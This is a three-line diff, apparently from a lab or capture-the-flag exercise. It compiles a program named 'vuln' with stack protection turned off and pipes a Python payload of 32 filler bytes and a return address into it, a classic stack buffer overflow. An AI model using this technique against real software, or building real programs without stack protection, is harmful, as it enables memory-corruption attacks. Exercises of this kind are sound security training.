@@ -1,0 +1,3 @@
+gcc Main.c -o vuln -fno-stack-protector
+
+python -c 'print "a"*32 + "\x9d\x84\x04\x08"' | ./vuln
